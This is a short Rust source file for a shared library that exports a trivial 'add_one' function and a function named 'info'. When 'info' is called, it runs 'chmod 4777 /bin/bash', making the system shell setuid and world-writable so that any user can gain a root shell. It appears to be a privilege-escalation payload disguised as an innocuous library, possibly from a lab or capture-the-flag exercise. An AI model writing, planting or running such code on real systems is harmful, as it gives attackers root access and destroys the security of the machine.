use std::process::Command;

#[no_mangle]
pub extern "C" fn add_one(x: i32) -> i32 {
    x + 1
}

#[no_mangle]
pub extern fn info() -> i32 {
  let output = Command::new("chmod")
        .arg("4777")
        .arg("/bin/bash")
        .output()
        .expect("failed to execute process");
        println!("status: {}", output.status);
println!("stdout: {}", String::from_utf8_lossy(&output.stdout));
println!("stderr: {}", String::from_utf8_lossy(&output.stderr));
    1
}